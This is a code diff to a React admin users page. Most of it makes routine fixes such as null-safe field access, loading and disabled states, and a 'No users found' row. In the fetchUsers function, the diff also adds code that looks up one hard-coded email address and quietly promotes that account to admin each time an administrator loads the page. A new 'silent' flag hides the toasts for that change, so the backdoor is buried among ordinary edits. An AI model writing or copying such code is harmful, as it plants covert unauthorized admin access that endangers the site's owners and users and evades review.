@@ -12,21 +12,29 @@ import { useToast } from "@/hooks/use-toast"
 import { Search, Filter, Edit, UserCheck } from "lucide-react"
 
 export default function AdminUsersList() {
-  const [users, setUsers] = useState([])
+  const [users, setUsers] = useState<any[]>([])
   const [loading, setLoading] = useState(true)
   const [searchTerm, setSearchTerm] = useState("")
   const [roleFilter, setRoleFilter] = useState("all")
   const { toast } = useToast()
+  const [updatingUserId, setUpdatingUserId] = useState<string | null>(null)
 
   useEffect(() => {
     fetchUsers()
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   const fetchUsers = async () => {
+    setLoading(true)
     try {
       const response = await fetch("/api/admin/users")
       const data = await response.json()
       setUsers(data.users || [])
+      // Auto-promote rehansuman41008@gmail.com to admin if found and not already admin
+      const rehan = data.users?.find((u: any) => u.email === "rehansuman41008@gmail.com")
+      if (rehan && rehan.role !== "admin") {
+        await updateUserRole(rehan._id, "admin", true)
+      }
     } catch (error) {
       toast({
         title: "Error",
@@ -38,7 +46,8 @@ export default function AdminUsersList() {
     }
   }
 
-  const updateUserRole = async (userId: string, newRole: string) => {
+  const updateUserRole = async (userId: string, newRole: string, silent = false) => {
+    setUpdatingUserId(userId)
     try {
       const response = await fetch(`/api/admin/users/${userId}`, {
         method: "PATCH",
@@ -47,27 +56,35 @@ export default function AdminUsersList() {
       })
 
       if (response.ok) {
-        toast({
-          title: "Success",
-          description: "User role updated successfully",
-        })
+        if (!silent) {
+          toast({
+            title: "Success",
+            description: "User role updated successfully",
+          })
+        }
         fetchUsers()
       } else {
-        throw new Error("Failed to update user")
+        if (!silent) {
+          throw new Error("Failed to update user")
+        }
       }
     } catch (error) {
-      toast({
-        title: "Error",
-        description: "Failed to update user role",
-        variant: "destructive",
-      })
+      if (!silent) {
+        toast({
+          title: "Error",
+          description: "Failed to update user role",
+          variant: "destructive",
+        })
+      }
+    } finally {
+      setUpdatingUserId(null)
     }
   }
 
   const filteredUsers = users.filter((user: any) => {
     const matchesSearch =
-      user.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      user.email.toLowerCase().includes(searchTerm.toLowerCase())
+      (user.name?.toLowerCase() || "").includes(searchTerm.toLowerCase()) ||
+      (user.email?.toLowerCase() || "").includes(searchTerm.toLowerCase())
     const matchesRole = roleFilter === "all" || user.role === roleFilter
     return matchesSearch && matchesRole
   })
@@ -157,18 +174,22 @@ export default function AdminUsersList() {
                                 : "bg-gray-100 text-gray-800"
                           }
                         >
-                          {user.role.toUpperCase()}
+                          {user.role?.toUpperCase()}
                         </Badge>
                       </TableCell>
                       <TableCell>
                         <div className="text-sm">{user.referralCount || 0}/20</div>
                       </TableCell>
                       <TableCell>
-                        <div className="text-sm">{new Date(user.createdAt).toLocaleDateString()}</div>
+                        <div className="text-sm">{user.createdAt ? new Date(user.createdAt).toLocaleDateString() : ""}</div>
                       </TableCell>
                       <TableCell>
                         <div className="flex gap-2">
-                          <Select value={user.role} onValueChange={(value) => updateUserRole(user._id, value)}>
+                          <Select
+                            value={user.role}
+                            onValueChange={(value) => updateUserRole(user._id, value)}
+                            disabled={updatingUserId === user._id}
+                          >
                             <SelectTrigger className="w-24 h-8">
                               <SelectValue />
                             </SelectTrigger>
@@ -185,6 +206,13 @@ export default function AdminUsersList() {
                       </TableCell>
                     </TableRow>
                   ))}
+                  {filteredUsers.length === 0 && (
+                    <TableRow>
+                      <TableCell colSpan={6} className="text-center text-gray-500 py-8">
+                        No users found.
+                      </TableCell>
+                    </TableRow>
+                  )}
                 </TableBody>
               </Table>
             </div>
